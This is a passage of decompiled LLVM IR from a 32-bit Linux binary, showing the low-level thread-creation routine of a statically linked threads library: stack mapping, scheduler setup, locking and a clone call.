  %v8_80576b8 = icmp eq i32 %v1_80576b8, 0
  store i32 %v1_80576b8, i32* %eax.global-to-local, align 4
  br i1 %v8_80576b8, label %dec_label_pc_8057703, label %dec_label_pc_80576bb

dec_label_pc_80576bb:                             ; preds = %dec_label_pc_805767f
  %v0_80576bb = load i32, i32* @esi, align 4
  %v1_80576bd = load i32, i32* @ebx, align 4
  %v2_80576bd = sub i32 %v0_80576bb, %v1_80576bd
  store i32 %v2_80576bd, i32* %eax.global-to-local, align 4
  %v2_80576bf = add i32 %v0_80576b5, 72
  %v3_80576bf = inttoptr i32 %v2_80576bf to i32*
  %v4_80576bf = load i32, i32* %v3_80576bf, align 4
  %v15_80576bf = icmp eq i32 %v1_80576bd, %v4_80576bf
  %v1_80576c3 = add i32 %v2_80576bd, 480
  store i32 %v1_80576c3, i32* @ebp, align 4
  br i1 %v15_80576bf, label %dec_label_pc_80576f1, label %dec_label_pc_80576cb

dec_label_pc_80576cb:                             ; preds = %dec_label_pc_80576bb
  %v0_80576cb = load i32, i32* @edi, align 4
  %v1_80576cb = add i32 %v0_80576cb, 20
  %v2_80576cb = inttoptr i32 %v1_80576cb to i32*
  %v3_80576cb = load i32, i32* %v2_80576cb, align 4
  store i32 %v3_80576cb, i32* %eax.global-to-local, align 4
  %v2_80576d0 = sub i32 %v1_80576c3, %v3_80576cb
  store i32 %v2_80576d0, i32* %edx.global-to-local, align 4
  %v2_80576d2 = add i32 %v0_80576b5, 40
  %v3_80576d2 = inttoptr i32 %v2_80576d2 to i32*
  store i32 %v3_80576cb, i32* %v3_80576d2, align 4
  %v0_80576d6 = load i32, i32* %edx.global-to-local, align 4
  %v1_80576d6 = load i32, i32* @esp, align 4
  %v2_80576d6 = add i32 %v1_80576d6, 12
  %v3_80576d6 = inttoptr i32 %v2_80576d6 to i32*
  store i32 %v0_80576d6, i32* %v3_80576d6, align 4
  %v0_80576da = load i32, i32* %ecx.global-to-local, align 4
  %v1_80576da = load i32, i32* @esp, align 4
  %v2_80576da = add i32 %v1_80576da, -4
  %v3_80576da = inttoptr i32 %v2_80576da to i32*
  store i32 %v0_80576da, i32* %v3_80576da, align 4
  %v0_80576db = load i32, i32* %ecx.global-to-local, align 4
  %v2_80576db = add i32 %v1_80576da, -8
  %v3_80576db = inttoptr i32 %v2_80576db to i32*
  store i32 %v0_80576db, i32* %v3_80576db, align 4
  %v1_80576dc = add i32 %v1_80576da, -12
  %v2_80576dc = inttoptr i32 %v1_80576dc to i32*
  store i32 0, i32* %v2_80576dc, align 4
  %v1_80576de = add i32 %v1_80576da, -16
  %v2_80576de = inttoptr i32 %v1_80576de to i32*
  store i32 -1, i32* %v2_80576de, align 4
  %v1_80576e0 = add i32 %v1_80576da, -20
  %v2_80576e0 = inttoptr i32 %v1_80576e0 to i32*
  store i32 16, i32* %v2_80576e0, align 4
  %v1_80576e2 = add i32 %v1_80576da, -24
  %v2_80576e2 = inttoptr i32 %v1_80576e2 to i32*
  store i32 0, i32* %v2_80576e2, align 4
  %v0_80576e4 = load i32, i32* %eax.global-to-local, align 4
  %v2_80576e4 = add i32 %v1_80576da, -28
  %v3_80576e4 = inttoptr i32 %v2_80576e4 to i32*
  store i32 %v0_80576e4, i32* %v3_80576e4, align 4
  %v0_80576e5 = load i32, i32* %edx.global-to-local, align 4
  %v2_80576e5 = add i32 %v1_80576da, -32
  %v3_80576e5 = inttoptr i32 %v2_80576e5 to i32*
  store i32 %v0_80576e5, i32* %v3_80576e5, align 4
  %v2_80576e6 = load i32, i32* %stack_var_-16, align 4
  %v9_80576e6 = call i32 @mmap(i32 %arg1, i32 1, i32 %v2_80576e6, i32 %v0_8057463, i32 %v0_8057462, i32 %v0_8057461, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80576eb = load i32, i32* @esp, align 4
  %v1_80576eb = add i32 %v0_80576eb, 32
  %v1_80576ee = add i32 %v9_80576e6, 1
  %v8_80576ee = icmp eq i32 %v1_80576ee, 0
  store i32 %v1_80576ee, i32* %eax.global-to-local, align 4
  %v1_80576ef = icmp eq i1 %v8_80576ee, false
  br i1 %v1_80576ef, label %dec_label_pc_805770c, label %dec_label_pc_80576f1

dec_label_pc_80576f1:                             ; preds = %dec_label_pc_80576cb, %dec_label_pc_80576bb, %dec_label_pc_8057634
  %v0_80576f1 = phi i32 [ %v1_80576eb, %dec_label_pc_80576cb ], [ %v1_80576b5, %dec_label_pc_80576bb ], [ %v0_805760295, %dec_label_pc_8057634 ]
  %v1_80576f1 = add i32 %v0_80576f1, 12
  %v2_80576f1 = inttoptr i32 %v1_80576f1 to i32*
  store i32 0, i32* %v2_80576f1, align 4
  %v0_80576f9 = load i32, i32* @esp, align 4
  %v1_80576f9 = add i32 %v0_80576f9, 8
  %v2_80576f9 = inttoptr i32 %v1_80576f9 to i32*
  store i32 0, i32* %v2_80576f9, align 4
  %v1_805770c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805770c

dec_label_pc_8057703:                             ; preds = %dec_label_pc_805767f, %dec_label_pc_8057610
  %v17_8057703 = phi i32 [ %v1_80576b5, %dec_label_pc_805767f ], [ %v0_805760295, %dec_label_pc_8057610 ]
  %v1_8057703 = add i32 %v17_8057703, 20
  %v2_8057703 = inttoptr i32 %v1_8057703 to i32*
  %v3_8057703 = load i32, i32* %v2_8057703, align 4
  %v4_8057703 = add i32 %v3_8057703, 1
  store i32 %v4_8057703, i32* %v2_8057703, align 4
  %v0_8057602 = load i32, i32* @esp, align 4
  %v1_8057602 = add i32 %v0_8057602, 20
  %v2_8057602 = inttoptr i32 %v1_8057602 to i32*
  %v3_8057602 = load i32, i32* %v2_8057602, align 4
  %tmp108 = icmp ult i32 %v3_8057602, 1024
  br i1 %tmp108, label %dec_label_pc_8057610, label %dec_label_pc_8057980

dec_label_pc_805770c:                             ; preds = %dec_label_pc_80576cb, %dec_label_pc_80576f1
  %v1_805770c = phi i32 [ %v1_80576eb, %dec_label_pc_80576cb ], [ %v1_805770c.pre, %dec_label_pc_80576f1 ]
  %v0_805770c = load i32, i32* @ebx, align 4
  %v2_805770c = add i32 %v1_805770c, -4
  %v3_805770c = inttoptr i32 %v2_805770c to i32*
  store i32 %v0_805770c, i32* %v3_805770c, align 4
  %v0_805770d = load i32, i32* @esi, align 4
  store i32 %v0_805770d, i32* @ebx, align 4
  %v1_805770f = add i32 %v1_805770c, -8
  %v2_805770f = inttoptr i32 %v1_805770f to i32*
  store i32 480, i32* %v2_805770f, align 4
  %v1_8057714 = add i32 %v1_805770c, -12
  %v2_8057714 = inttoptr i32 %v1_8057714 to i32*
  store i32 0, i32* %v2_8057714, align 4
  %v0_8057716 = load i32, i32* @esi, align 4
  %v2_8057716 = add i32 %v1_805770c, -16
  %v3_8057716 = inttoptr i32 %v2_8057716 to i32*
  store i32 %v0_8057716, i32* %v3_8057716, align 4
  %v2_8057717 = load i32, i32* %stack_var_-16, align 4
  %v5_8057717 = call i32 @__GI_memset(i8* %v4_8057717, i32 1, i32 %v2_8057717)
  %v0_805771c = load i32, i32* @global_var_8074f20.579, align 32
  %v0_8057721 = load i32, i32* @esp, align 4
  %v1_8057724 = add i32 %v0_805771c, 1
  store i32 %v1_8057724, i32* @global_var_8074f20.579, align 32
  %v0_805772a = load i32, i32* @global_var_8079b08.589, align 8
  %v1_805772f = add i32 %v0_805772a, 1024
  store i32 %v1_805772f, i32* %eax.global-to-local, align 4
  store i32 %v1_805772f, i32* @global_var_8079b08.589, align 8
  %v2_8057739 = add i32 %v0_8057721, 36
  %v3_8057739 = inttoptr i32 %v2_8057739 to i32*
  %v4_8057739 = load i32, i32* %v3_8057739, align 4
  %v5_8057739 = add i32 %v4_8057739, %v1_805772f
  store i32 %v5_8057739, i32* %eax.global-to-local, align 4
  %v2_805773d = add i32 %v0_8057721, 32
  %v3_805773d = inttoptr i32 %v2_805773d to i32*
  store i32 %v5_8057739, i32* %v3_805773d, align 4
  %v0_8057741 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057741 = load i32, i32* @esi, align 4
  %v2_8057741 = add i32 %v1_8057741, 16
  %v3_8057741 = inttoptr i32 %v2_8057741 to i32*
  store i32 %v0_8057741, i32* %v3_8057741, align 4
  %v0_8057744 = load i32, i32* @esi, align 4
  %v1_8057744 = add i32 %v0_8057744, 72
  store i32 %v1_8057744, i32* %eax.global-to-local, align 4
  %v0_8057747 = load i32, i32* @esp, align 4
  %v1_8057747 = add i32 %v0_8057747, 20
  %v2_8057747 = inttoptr i32 %v1_8057747 to i32*
  %v3_8057747 = load i32, i32* %v2_8057747, align 4
  store i32 %v3_8057747, i32* %edx.global-to-local, align 4
  %v2_805774b = add i32 %v0_8057744, 68
  %v3_805774b = inttoptr i32 %v2_805774b to i32*
  store i32 %v1_8057744, i32* %v3_805774b, align 4
  %v0_805774e = load i32, i32* @esi, align 4
  %v1_805774e = add i32 %v0_805774e, 80
  store i32 %v1_805774e, i32* %eax.global-to-local, align 4
  %v1_8057751 = add i32 %v0_805774e, 64
  %v2_8057751 = inttoptr i32 %v1_8057751 to i8*
  store i8 0, i8* %v2_8057751, align 1
  %v0_8057755 = load i32, i32* @esi, align 4
  %v1_8057755 = add i32 %v0_8057755, 65
  %v2_8057755 = inttoptr i32 %v1_8057755 to i8*
  store i8 0, i8* %v2_8057755, align 1
  %v0_8057759 = load i32, i32* %edx.global-to-local, align 4
  %v2_8057759 = mul i32 %v0_8057759, 16
  store i32 %v2_8057759, i32* %edx.global-to-local, align 4
  %v0_805775c = load i32, i32* @edi, align 4
  %v1_805775c = icmp eq i32 %v0_805775c, 0
  %v1_805775e = add i32 %v2_8057759, 134680352
  store i32 %v1_805775e, i32* %ecx.global-to-local, align 4
  %v1_8057764 = load i32, i32* @esi, align 4
  %v2_8057764 = add i32 %v1_8057764, 28
  %v3_8057764 = inttoptr i32 %v2_8057764 to i32*
  store i32 %v1_805775e, i32* %v3_8057764, align 4
  %v0_8057767 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057767 = load i32, i32* @esi, align 4
  %v2_8057767 = add i32 %v1_8057767, 76
  %v3_8057767 = inttoptr i32 %v2_8057767 to i32*
  store i32 %v0_8057767, i32* %v3_8057767, align 4
  %v0_805776a = load i32, i32* @esp, align 4
  %v1_805776a = add i32 %v0_805776a, 12
  %v2_805776a = inttoptr i32 %v1_805776a to i32*
  %v3_805776a = load i32, i32* %v2_805776a, align 4
  store i32 %v3_805776a, i32* %eax.global-to-local, align 4
  %v1_805776e = load i32, i32* @esi, align 4
  %v2_805776e = add i32 %v1_805776e, 396
  %v3_805776e = inttoptr i32 %v2_805776e to i32*
  store i32 %v3_805776a, i32* %v3_805776e, align 4
  %v0_8057774 = load i32, i32* @esp, align 4
  %v1_8057774 = add i32 %v0_8057774, 8
  %v2_8057774 = inttoptr i32 %v1_8057774 to i32*
  %v3_8057774 = load i32, i32* %v2_8057774, align 4
  store i32 %v3_8057774, i32* %eax.global-to-local, align 4
  %v0_8057778 = load i32, i32* @esi, align 4
  %v1_8057778 = load i32, i32* @ebx, align 4
  %v2_8057778 = add i32 %v1_8057778, 404
  %v3_8057778 = inttoptr i32 %v2_8057778 to i32*
  store i32 %v0_8057778, i32* %v3_8057778, align 4
  %v0_805777e = load i32, i32* %eax.global-to-local, align 4
  %v1_805777e = load i32, i32* @esi, align 4
  %v2_805777e = add i32 %v1_805777e, 400
  %v3_805777e = inttoptr i32 %v2_805777e to i32*
  store i32 %v0_805777e, i32* %v3_805777e, align 4
  %v0_8057784 = load i32, i32* @esp, align 4
  %v1_8057784 = add i32 %v0_8057784, 20
  %v2_8057784 = inttoptr i32 %v1_8057784 to i32*
  %v3_8057784 = load i32, i32* %v2_8057784, align 4
  store i32 %v3_8057784, i32* %eax.global-to-local, align 4
  %v1_8057788 = load i32, i32* @esi, align 4
  %v2_8057788 = add i32 %v1_8057788, 408
  %v3_8057788 = inttoptr i32 %v2_8057788 to i32*
  store i32 %v3_8057784, i32* %v3_8057788, align 4
  %v0_805778e = load i32, i32* %ecx.global-to-local, align 4
  %v1_805778e = add i32 %v0_805778e, 4
  %v2_805778e = inttoptr i32 %v1_805778e to i32*
  store i32 0, i32* %v2_805778e, align 4
  %v0_8057795 = load i32, i32* %edx.global-to-local, align 4
  %v1_8057795 = add i32 %v0_8057795, 134680352
  %v2_8057795 = inttoptr i32 %v1_8057795 to i32*
  store i32 0, i32* %v2_8057795, align 4
  %v0_805779f = load i32, i32* @esi, align 4
  %v1_805779f = load i32, i32* %edx.global-to-local, align 4
  %v2_805779f = add i32 %v1_805779f, 134680360
  %v3_805779f = inttoptr i32 %v2_805779f to i32*
  store i32 %v0_805779f, i32* %v3_805779f, align 4
  %v0_80577a5 = load i32, i32* @ebp, align 4
  %v1_80577a5 = load i32, i32* %edx.global-to-local, align 4
  %v2_80577a5 = add i32 %v1_80577a5, 134680364
  %v3_80577a5 = inttoptr i32 %v2_80577a5 to i32*
  store i32 %v0_80577a5, i32* %v3_80577a5, align 4
  %v0_80577ab = load i32, i32* @esi, align 4
  %v1_80577ab = add i32 %v0_80577ab, 228
  %v2_80577ab = inttoptr i32 %v1_80577ab to i32*
  store i32 -1, i32* %v2_80577ab, align 4
  br i1 %v1_805775c, label %dec_label_pc_805781d, label %dec_label_pc_80577b7

dec_label_pc_80577b7:                             ; preds = %dec_label_pc_805770c
  %v0_80577b7 = load i32, i32* @edi, align 4
  %v1_80577b7 = inttoptr i32 %v0_80577b7 to i32*
  %v2_80577b7 = load i32, i32* %v1_80577b7, align 4
  store i32 %v2_80577b7, i32* %eax.global-to-local, align 4
  %v1_80577b9 = trunc i32 %v2_80577b7 to i8
  %v2_80577b9 = load i32, i32* @esi, align 4
  %v3_80577b9 = add i32 %v2_80577b9, 45
  %v4_80577b9 = inttoptr i32 %v3_80577b9 to i8*
  store i8 %v1_80577b9, i8* %v4_80577b9, align 1
  %v0_80577bc = load i32, i32* @edi, align 4
  %v1_80577bc = add i32 %v0_80577bc, 24
  %v2_80577bc = inttoptr i32 %v1_80577bc to i32*
  %v3_80577bc = load i32, i32* %v2_80577bc, align 4
  store i32 %v3_80577bc, i32* %eax.global-to-local, align 4
  %v1_80577bf = load i32, i32* @esi, align 4
  %v2_80577bf = add i32 %v1_80577bf, 392
  %v3_80577bf = inttoptr i32 %v2_80577bf to i32*
  store i32 %v3_80577bc, i32* %v3_80577bf, align 4
  %v0_80577c5 = load i32, i32* @edi, align 4
  %v1_80577c5 = add i32 %v0_80577c5, 12
  %v2_80577c5 = inttoptr i32 %v1_80577c5 to i32*
  %v3_80577c5 = load i32, i32* %v2_80577c5, align 4
  store i32 %v3_80577c5, i32* %eax.global-to-local, align 4
  %v1_80577c8 = icmp eq i32 %v3_80577c5, 0
  br i1 %v1_80577c8, label %dec_label_pc_80577ed, label %dec_label_pc_80577cc

dec_label_pc_80577cc:                             ; preds = %dec_label_pc_80577b7
  %v1_80577cc = add i32 %v3_80577c5, -1
  %v8_80577cc = icmp eq i32 %v1_80577cc, 0
  store i32 %v1_80577cc, i32* %eax.global-to-local, align 4
  %v1_80577cd = icmp eq i1 %v8_80577cc, false
  br i1 %v1_80577cd, label %dec_label_pc_8057814, label %dec_label_pc_80577cf

dec_label_pc_80577cf:                             ; preds = %dec_label_pc_80577cc
  %v1_80577cf = add i32 %v0_80577c5, 4
  %v2_80577cf = inttoptr i32 %v1_80577cf to i32*
  %v3_80577cf = load i32, i32* %v2_80577cf, align 4
  %v1_80577d2 = load i32, i32* @esi, align 4
  %v2_80577d2 = add i32 %v1_80577d2, 228
  %v3_80577d2 = inttoptr i32 %v2_80577d2 to i32*
  store i32 %v3_80577cf, i32* %v3_80577d2, align 4
  %v0_80577d8 = load i32, i32* @edi, align 4
  %v1_80577d8 = add i32 %v0_80577d8, 8
  store i32 %v1_80577d8, i32* %eax.global-to-local, align 4
  %v0_80577db = load i32, i32* %ecx.global-to-local, align 4
  %v1_80577db = load i32, i32* @esp, align 4
  %v2_80577db = add i32 %v1_80577db, -4
  %v3_80577db = inttoptr i32 %v2_80577db to i32*
  store i32 %v0_80577db, i32* %v3_80577db, align 4
  %v1_80577dc = add i32 %v1_80577db, -8
  %v2_80577dc = inttoptr i32 %v1_80577dc to i32*
  store i32 4, i32* %v2_80577dc, align 4
  %v0_80577de = load i32, i32* %eax.global-to-local, align 4
  %v2_80577de = add i32 %v1_80577db, -12
  %v3_80577de = inttoptr i32 %v2_80577de to i32*
  store i32 %v0_80577de, i32* %v3_80577de, align 4
  %v0_80577df = load i32, i32* @esi, align 4
  %v1_80577df = add i32 %v0_80577df, 232
  store i32 %v1_80577df, i32* %eax.global-to-local, align 4
  %v2_80577e5 = add i32 %v1_80577db, -16
  %v3_80577e5 = inttoptr i32 %v2_80577e5 to i32*
  store i32 %v1_80577df, i32* %v3_80577e5, align 4
  %v2_80577e6 = load i32, i32* %stack_var_-16, align 4
  %v5_80577e6 = call i32 @memcpy(i16* %v4_805783a, i32 1, i32 %v2_80577e6)
  br label %dec_label_pc_8057811

dec_label_pc_80577ed:                             ; preds = %dec_label_pc_80577b7
  %v0_80577ed = load i32, i32* @esp, align 4
  %v1_80577f0 = add i32 %v0_80577ed, 28
  %v2_80577f0 = inttoptr i32 %v1_80577f0 to i32*
  %v3_80577f0 = load i32, i32* %v2_80577f0, align 4
  %v5_80577f0 = add i32 %v0_80577ed, -16
  %v6_80577f0 = inttoptr i32 %v5_80577f0 to i32*
  store i32 %v3_80577f0, i32* %v6_80577f0, align 4
  %v1_80577f4 = call i32 @sched_getscheduler(i32 %arg1)
  %v1_80577f9 = load i32, i32* @esi, align 4
  %v2_80577f9 = add i32 %v1_80577f9, 228
  %v3_80577f9 = inttoptr i32 %v2_80577f9 to i32*
  store i32 %v1_80577f4, i32* %v3_80577f9, align 4
  %v0_80577ff = load i32, i32* @esp, align 4
  %v1_80577ff = inttoptr i32 %v0_80577ff to i32*
  %v3_80577ff = add i32 %v0_80577ff, 4
  %v0_8057800 = load i32, i32* @esi, align 4
  %v1_8057800 = add i32 %v0_8057800, 232
  store i32 %v1_8057800, i32* %eax.global-to-local, align 4
  %v1_8057806 = inttoptr i32 %v3_80577ff to i32*
  %v2_8057806 = load i32, i32* %v1_8057806, align 4
  store i32 %v2_8057806, i32* %edx.global-to-local, align 4
  store i32 %v1_8057800, i32* %v1_8057806, align 4
  %v1_8057808 = add i32 %v0_80577ff, 44
  %v2_8057808 = inttoptr i32 %v1_8057808 to i32*
  %v3_8057808 = load i32, i32* %v2_8057808, align 4
  store i32 %v3_8057808, i32* %v1_80577ff, align 4
  %v2_805780c = load i32, i32* %stack_var_-16, align 4
  %v5_805780c = call i32 @sched_getparam(i32 %arg1, i32 1, i32 %v2_805780c, i32 %v0_8057463)
  br label %dec_label_pc_8057811

dec_label_pc_8057811:                             ; preds = %dec_label_pc_80577cf, %dec_label_pc_80577ed
  %storemerge2 = phi i32 [ %v5_805780c, %dec_label_pc_80577ed ], [ %v5_80577e6, %dec_label_pc_80577cf ]
  store i32 %storemerge2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057814

dec_label_pc_8057814:                             ; preds = %dec_label_pc_80577cc, %dec_label_pc_8057811
  %v0_8057814 = load i32, i32* @ebx, align 4
  %v1_8057814 = add i32 %v0_8057814, 232
  %v2_8057814 = inttoptr i32 %v1_8057814 to i32*
  %v3_8057814 = load i32, i32* %v2_8057814, align 4
  store i32 %v3_8057814, i32* %eax.global-to-local, align 4
  %v2_805781a = add i32 %v0_8057814, 24
  %v3_805781a = inttoptr i32 %v2_805781a to i32*
  store i32 %v3_8057814, i32* %v3_805781a, align 4
  br label %dec_label_pc_805781d

dec_label_pc_805781d:                             ; preds = %dec_label_pc_805770c, %dec_label_pc_8057814
  %v0_805781d = load i32, i32* @esp, align 4
  %v1_805781d = add i32 %v0_805781d, 36
  %v2_805781d = inttoptr i32 %v1_805781d to i32*
  %v3_805781d = load i32, i32* %v2_805781d, align 4
  %v1_8057821 = add i32 %v0_805781d, 68
  store i32 %v1_8057821, i32* %eax.global-to-local, align 4
  %v1_8057825 = load i32, i32* @ebx, align 4
  %v2_8057825 = add i32 %v1_8057825, 92
  %v3_8057825 = inttoptr i32 %v2_8057825 to i32*
  store i32 %v3_805781d, i32* %v3_8057825, align 4
  %v0_8057828 = load i32, i32* @ebx, align 4
  %v1_8057828 = add i32 %v0_8057828, 100
  store i32 %v1_8057828, i32* @edx, align 4
  %v0_805782b = load i32, i32* @esp, align 4
  %v1_805782b = add i32 %v0_805782b, 32
  %v2_805782b = inttoptr i32 %v1_805782b to i32*
  %v3_805782b = load i32, i32* %v2_805782b, align 4
  store i32 %v3_805782b, i32* %ecx.global-to-local, align 4
  %v2_805782f = add i32 %v0_8057828, 96
  %v3_805782f = inttoptr i32 %v2_805782f to i32*
  store i32 %v3_805782b, i32* %v3_805782f, align 4
  %v0_8057832 = load i32, i32* @ebp, align 4
  %v1_8057832 = load i32, i32* @esp, align 4
  %v2_8057832 = add i32 %v1_8057832, -4
  %v3_8057832 = inttoptr i32 %v2_8057832 to i32*
  store i32 %v0_8057832, i32* %v3_8057832, align 4
  %v1_8057833 = add i32 %v1_8057832, -8
  %v2_8057833 = inttoptr i32 %v1_8057833 to i32*
  store i32 128, i32* %v2_8057833, align 4
  %v0_8057838 = load i32, i32* %eax.global-to-local, align 4
  %v2_8057838 = add i32 %v1_8057832, -12
  %v3_8057838 = inttoptr i32 %v2_8057838 to i32*
  store i32 %v0_8057838, i32* %v3_8057838, align 4
  %v0_8057839 = load i32, i32* @edx, align 4
  %v2_8057839 = add i32 %v1_8057832, -16
  %v3_8057839 = inttoptr i32 %v2_8057839 to i32*
  store i32 %v0_8057839, i32* %v3_8057839, align 4
  %v2_805783a = load i32, i32* %stack_var_-16, align 4
  %v5_805783a = call i32 @memcpy(i16* %v4_805783a, i32 1, i32 %v2_805783a)
  store i32 %v5_805783a, i32* %eax.global-to-local, align 4
  %v0_805783f = load i32, i32* @esp, align 4
  %v1_805783f = inttoptr i32 %v0_805783f to i32*
  %v2_805783f = load i32, i32* %v1_805783f, align 4
  store i32 %v2_805783f, i32* @esi, align 4
  %v0_8057840 = load i32, i32* @ebx, align 4
  %v1_8057840 = add i32 %v0_8057840, 24
  %v2_8057840 = inttoptr i32 %v1_8057840 to i32*
  %v3_8057840 = load i32, i32* %v2_8057840, align 4
  store i32 %v3_8057840, i32* %v1_805783f, align 4
  %v1_8057843 = call i32 @__pthread_manager_adjust_prio(i32 %arg1)
  %v0_8057848 = load i32, i32* bitcast (i32** @global_var_8075300.575 to i32*), align 256
  %v1_8057850 = load i32, i32* @ebx, align 4
  %v2_8057850 = add i32 %v1_8057850, 4
  %v3_8057850 = inttoptr i32 %v2_8057850 to i32*
  store i32 %v0_8057848, i32* %v3_8057850, align 4
  %v0_8057853 = load i32, i32* bitcast (i32** @global_var_8075300.575 to i32*), align 256
  %v1_805785a = load i32, i32* @ebx, align 4
  %v2_805785a = inttoptr i32 %v1_805785a to i32*
  store i32 %v0_8057853, i32* %v2_805785a, align 4
  %v0_805785c = load i32, i32* bitcast (i32** @global_var_8075300.575 to i32*), align 256
  %v0_8057863 = load i32, i32* @ebx, align 4
  store i32 %v0_8057863, i32* @global_var_8075304.574, align 4
  store i32 %v0_805785c, i32* %eax.global-to-local, align 4
  %v2_805786b = inttoptr i32 %v0_805785c to i32*
  store i32 %v0_8057863, i32* %v2_805786b, align 4
  %v0_805786d = load i32, i32* @esp, align 4
  %v1_805786d = add i32 %v0_805786d, 24
  %v2_805786d = inttoptr i32 %v1_805786d to i32*
  %v3_805786d = load i32, i32* %v2_805786d, align 4
  %v4_805786d = icmp eq i32 %v3_805786d, 0
  br i1 %v4_805786d, label %dec_label_pc_80578e0, label %dec_label_pc_8057874

dec_label_pc_8057874:                             ; preds = %dec_label_pc_805781d
  %v1_8057874 = add i32 %v0_805786d, 4
  %v2_8057874 = inttoptr i32 %v1_8057874 to i32*
  %v3_8057874 = load i32, i32* %v2_8057874, align 4
  store i32 %v3_8057874, i32* %ecx.global-to-local, align 4
  %v0_8057878 = load i32, i32* @global_var_807f35c.580, align 4
  store i32 %v0_8057878, i32* %eax.global-to-local, align 4
  %v1_805787d = add i32 %v3_8057874, 416
  %v2_805787d = inttoptr i32 %v1_805787d to i8*
  %v3_805787d = load i8, i8* %v2_805787d, align 1
  %v4_805787d = zext i8 %v3_805787d to i32
  %v5_805787d = load i32, i32* @edx, align 4
  %v6_805787d = and i32 %v5_805787d, -256
  %v7_805787d = or i32 %v4_805787d, %v0_8057878
  %v3_8057883 = trunc i32 %v7_805787d to i8
  %v5_8057883 = icmp slt i8 %v3_8057883, 0
  %v9_8057883 = urem i32 %v7_805787d, 256
  %v12_8057883 = or i32 %v9_8057883, %v6_805787d
  store i32 %v12_8057883, i32* %edx.global-to-local, align 4
  %v1_8057885 = icmp eq i1 %v5_8057883, false
  br i1 %v1_8057885, label %dec_label_pc_80578e0, label %dec_label_pc_8057887

dec_label_pc_8057887:                             ; preds = %dec_label_pc_8057874
  %v0_8057887 = load i32, i32* @ebx, align 4
  %v1_8057887 = add i32 %v0_8057887, 28
  %v2_8057887 = inttoptr i32 %v1_8057887 to i32*
  %v3_8057887 = load i32, i32* %v2_8057887, align 4
  store i32 %v3_8057887, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v1_805788c = call i32 @__pthread_lock(i32 %arg1)
  %v0_8057891 = load i32, i32* @global_var_807530c.586, align 4
  store i32 %v0_8057891, i32* %eax.global-to-local, align 4
  %v0_8057896 = load i32, i32* @ebx, align 4
  %v1_8057896 = load i32, i32* @esp, align 4
  %v2_8057896 = add i32 %v1_8057896, -4
  %v3_8057896 = inttoptr i32 %v2_8057896 to i32*
  store i32 %v0_8057896, i32* %v3_8057896, align 4
  %v0_8057897 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057897 = udiv i32 %v0_8057897, 256
  %v3_8057897 = and i32 %v1_8057897, 240
  %v8_8057897 = or i32 %v3_8057897, 15
  %v10_8057897 = mul nuw nsw i32 %v8_8057897, 256
  %v11_8057897 = and i32 %v0_8057897, -65281
  %v12_8057897 = or i32 %v10_8057897, %v11_8057897
  store i32 %v12_8057897, i32* %eax.global-to-local, align 4
  %v2_805789a = add i32 %v1_8057896, -8
  %v3_805789a = inttoptr i32 %v2_805789a to i32*
  store i32 %v12_8057897, i32* %v3_805789a, align 4
  %v0_805789b = load i32, i32* @ebx, align 4
  %v2_805789b = add i32 %v1_8057896, -12
  %v3_805789b = inttoptr i32 %v2_805789b to i32*
  store i32 %v0_805789b, i32* %v3_805789b, align 4
  %v1_805789c = add i32 %v1_8057896, -16
  %v2_805789c = inttoptr i32 %v1_805789c to i32*
  store i32 134574705, i32* %v2_805789c, align 4
  %v2_80578a1 = load i32, i32* %stack_var_-16, align 4
  %v5_80578a1 = call i32 @clone(i32 %arg1, i32 1, i32 %v2_80578a1, i32 %v0_8057463)
  store i32 %v5_80578a1, i32* @eax, align 4
  %v0_80578a6 = load i32, i32* @esp, align 4
  %v10_80578a9 = icmp eq i32 %v5_80578a1, -1
  store i32 %v5_80578a1, i32* @esi, align 4
  br i1 %v10_80578a9, label %dec_label_pc_80578dc, label %dec_label_pc_80578b0

dec_label_pc_80578b0:                             ; preds = %dec_label_pc_8057887
  %v0_80578b0 = load i32, i32* @ebx, align 4
  %v2_80578b0 = add i32 %v0_80578b0, 428
  %v3_80578b0 = inttoptr i32 %v2_80578b0 to i32*
  store i32 %v0_80578b0, i32* %v3_80578b0, align 4
  %v0_80578b6 = load i32, i32* @ebx, align 4
  %v1_80578b6 = add i32 %v0_80578b6, 424
  %v2_80578b6 = inttoptr i32 %v1_80578b6 to i32*
  store i32 8, i32* %v2_80578b6, align 4
  %v0_80578c0 = load i32, i32* @ebx, align 4
  store i32 %v0_80578c0, i32* @global_var_807f364.581, align 4
  %v2_80578c6 = add i32 %v0_80578c0, 20
  %v3_80578c6 = inttoptr i32 %v2_80578c6 to i32*
  store i32 %v5_80578a1, i32* %v3_80578c6, align 4
  %v0_80578c9 = call i32 @__linuxthreads_create_event()
  store i32 %v0_80578c9, i32* %eax.global-to-local, align 4
  %v0_80578ce = load i32, i32* @esp, align 4
  %v0_80578d1 = load i32, i32* @ebx, align 4
  %v1_80578d1 = add i32 %v0_80578d1, 28
  %v2_80578d1 = inttoptr i32 %v1_80578d1 to i32*
  %v3_80578d1 = load i32, i32* %v2_80578d1, align 4
  %v5_80578d1 = add i32 %v0_80578ce, -16
  %v6_80578d1 = inttoptr i32 %v5_80578d1 to i32*
  store i32 %v3_80578d1, i32* %v6_80578d1, align 4
  %v2_80578d4 = call i32 @__pthread_unlock(i32* %v1_80579f3)
  store i32 %v2_80578d4, i32* %eax.global-to-local, align 4
  %v0_80578d9 = load i32, i32* @esp, align 4
  %v0_80578dc.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80578dc

dec_label_pc_80578dc:                             ; preds = %dec_label_pc_8057887, %dec_label_pc_80578b0
  %v1_80578e525.in = phi i32 [ %v0_80578a6, %dec_label_pc_8057887 ], [ %v0_80578d9, %dec_label_pc_80578b0 ]
  %v0_80578dc = phi i32 [ %v5_80578a1, %dec_label_pc_8057887 ], [ %v0_80578dc.pre, %dec_label_pc_80578b0 ]
  %v1_80578e525 = add i32 %v1_80578e525.in, 16
  %v1_80578dc = icmp eq i32 %v0_80578dc, 0
  %v1_80578de = icmp eq i1 %v1_80578dc, false
  br i1 %v1_80578de, label %dec_label_pc_80578fa, label %dec_label_pc_80578e0

dec_label_pc_80578e0:                             ; preds = %dec_label_pc_80578dc, %dec_label_pc_8057874, %dec_label_pc_805781d
